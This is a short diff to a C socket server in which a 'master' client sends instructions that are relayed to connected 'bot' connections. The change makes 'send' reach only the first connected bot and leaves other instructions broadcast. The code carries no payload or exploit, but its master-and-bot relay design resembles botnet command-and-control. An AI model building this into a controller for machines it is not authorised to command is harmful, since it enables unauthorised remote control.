@@ -37,9 +37,12 @@ int main(int argc, char **argv)
    char show_message_temp[255];
    char search_message[255];
    char search_message_temp[255];
+   char send_message[255];
+   char ip_addr[255];
    char *temp;
    int bot_table[8] = {0,0,0,0,0,0,0,0};
    int search_num = 0;
+   int packet_num = 0;
 
    struct sockaddr_in clientaddr, serveraddr, botaddr;
    struct pollfd bot[MAX_SOCKET];
@@ -172,7 +175,14 @@ int main(int argc, char **argv)
            }
            else if(strstr(instruction,"send"))
            {
-               
+               for(i=1;i<MAX_SOCKET;i++)
+               {
+                   if(bot[i].fd >= 0)
+                   {
+                       write(bot[i].fd,message_from_master,sizeof(message_from_master));
+                       break;
+                   }
+               }
            }
            else if(strstr(instruction,"search"))
            {
@@ -222,7 +232,8 @@ int main(int argc, char **argv)
                }
                write(client_sockfd,buf,sizeof(buf));//send to master
            }
-           write(bot[i].fd,message_from_master,sizeof(message_from_master));//broadcast
+           if(!strstr(instruction,"send"))
+               write(bot[i].fd,message_from_master,sizeof(message_from_master));//broadcast
        }
        memset(message_from_master,'\0',255);
    }
